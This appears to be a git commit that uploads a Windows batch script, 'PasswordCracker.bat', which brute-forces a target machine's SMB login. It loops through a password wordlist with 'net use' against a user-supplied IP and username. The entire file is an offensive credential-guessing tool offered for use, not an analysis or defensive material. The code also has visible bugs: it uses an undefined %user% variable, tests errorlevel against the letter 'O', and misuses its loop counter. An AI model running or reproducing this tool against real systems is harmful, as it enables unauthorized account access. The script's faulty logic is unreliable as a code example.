e1c2107babaed4a6e19f3354c5bce39e4c387ef0
Clowning <137356280+clowning4508@users.noreply.github.com>
2024-09-16 08:14:36 +0100

    Add files via upload

---
+++ PasswordCracker.bat
@@ -0,0 +1,29 @@
+@echo off
+title FANBOYS Bruteforce - Suings
+color A
+echo.
+set /P ip="Enter IP Address: "
+set /P username="Enter Username: "
+set /P wordlist="Enter Password List: "
+
+set /a count=1
+for /f %%a in (%wordlist%) do (
+  set pass=%%a
+  call :attempt
+)
+echo Password not Found :(
+pause
+exit
+
+:success
+echo.
+echo Password Found!: %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT %count%] [%pass%]
+set /a count=%count%+1
+if %errorlevel% EQU O goto success
